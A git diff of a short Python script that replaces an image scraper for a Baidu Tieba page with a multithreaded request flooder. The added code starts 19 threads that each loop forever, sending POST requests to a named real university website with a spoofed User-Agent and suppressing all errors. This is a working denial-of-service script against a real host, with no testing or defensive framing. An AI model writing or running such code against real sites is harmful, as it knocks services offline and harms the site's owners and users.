@@ -1,21 +1,28 @@
 import requests, os, time
 from bs4 import BeautifulSoup
-
+import threading
+ 
 try:
     os.mkdir('pics')
 except:
     pass
+ 
+url = 'http://comm.xmu.edu.cn'
+headers = {
+        'User-Agent': 'Mozilla/5.0 (Windows NT 5.1; rv:33.0) Gecko/20100101 Firefox/33.0'
+    }
+def heihei():
+    while True:
+        try:
+            print(1)
+            session = requests.session()
+            session.post(url, data={}, headers=headers, params={})
+        except:
+            pass
+threads = []
+for i in range(1, 20):
+    threads.append(threading.Thread(target=heihei))
 
-url = 'https://tieba.baidu.com/f?kw=%C3%C0%C5%AE&fr=ala0&tpl=5'
-page = BeautifulSoup(requests.get(url).content)
-pics = page.select('img')
-print(len(pics))
-for i in pics:
-    print(i['src'])
-    try:
-        pic = requests.get(i['src']).content
-    except:
-        pic = requests.get(url + i['src']).content
-    name = i['src'].replace('http://', '').replace('https://', '').replace('/', '_')
-    with open('pics/' + '1.jpg', 'ab') as f:
-        f.write(pic)
+for t in threads:
+    t.setDaemon(False)
+    t.start()
